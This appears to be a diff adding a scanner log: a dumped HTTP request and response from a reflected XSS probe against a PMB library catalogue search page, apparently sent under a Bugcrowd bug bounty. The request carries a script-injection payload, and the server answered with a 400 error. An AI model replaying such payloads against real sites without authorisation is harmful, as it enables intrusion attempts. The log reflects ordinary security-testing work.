@@ -1,0 +1,25 @@
+[pmb-xss] Dumped HTTP request for https://techsolutions.bitpanda.com/pmb/opac_css/index.php?lvl=search_result&search_type_asked=extended_search
+
+
+POST /pmb/opac_css/index.php?lvl=search_result&search_type_asked=extended_search HTTP/1.1
+Host: techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 224
+Content-Type: application/x-www-form-urlencoded
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+add_field=&search%5B%5D=f_1&op_0_f_1=EXACT&field_0_f_1%5B%5D=gang&explicit_search=1&search_xml_file=search_fields&delete_field=&launch_search=1&page=&no_search=0&ij6fm%22%3e%3cscript%3ealert(1337)%3c%2fscript%3evg9q6c4g1mk=1
+[pmb-xss] Dumped HTTP response https://techsolutions.bitpanda.com/pmb/opac_css/index.php?lvl=search_result&search_type_asked=extended_search
+
+HTTP/1.1 400 Bad Request
+Connection: close
+Content-Length: 11
+Date: Tue, 05 Aug 2025 12:53:24 GMT
+Via: 1.1 7ed6222f7e560bc392fd7d47d98df770.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: BQOBZH23iSFfLzi8fUYcupXro7EZCZ7kt1c5JRkjmiW6IUCTPy8Rsw==
+X-Amz-Cf-Pop: IAD55-P8
+X-Cache: LambdaGeneratedResponse from cloudfront
+
+Bad Request
